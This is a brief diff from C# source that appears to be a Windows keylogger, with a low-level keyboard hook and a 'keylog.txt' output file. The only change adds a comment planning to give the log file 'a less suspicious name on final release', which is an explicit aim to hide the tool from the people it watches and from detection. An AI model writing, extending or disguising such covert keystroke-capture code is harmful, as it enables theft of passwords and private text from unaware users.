@@ -81,7 +81,7 @@ namespace WTKL
         private const string CAPS_LOCK_STR = "CAPSLOCK";
         private const string SPACE_STR = "SPACE";
 
-        private const string TEXT_FILE_NAME = "keylog.txt";
+        private const string TEXT_FILE_NAME = "keylog.txt"; //todo give less suspicious name on final release
 
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
